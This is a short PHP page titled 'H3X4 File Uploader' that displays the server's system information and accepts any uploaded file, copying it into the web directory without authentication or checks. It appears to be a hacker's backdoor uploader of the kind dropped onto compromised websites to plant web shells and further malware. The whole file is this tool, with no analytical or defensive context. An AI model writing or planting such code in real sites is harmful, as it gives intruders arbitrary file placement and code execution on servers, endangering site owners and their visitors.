<html>

<head>

<title>
	H3X4
</title>

<meta http-equiv=Content-Type content=text/html; charset=utf-8 charset=utf-8>

</head>

<body>

<p>
	<b>
	<span lang="ar-ma"> <h1> H3XA </h1> </span> 
	File Uploader 
	</b>
</p>

<?php

echo '<b><br><br>'.php_uname().'<br></b> </br>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader"> <br>';
echo '<input type="file" name="file" size="50"><input name="upl" type="submit" id="upl" value="Upload"> </form>';

if( $_POST['upl'] == "Upload"){
 if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) 
	{echo '<b>Uploaded Successfully</b><br><br>';}
else { echo '<b>Upload Failed! </b><br><br>'; }
}

?>

</p>

</body>

</html>
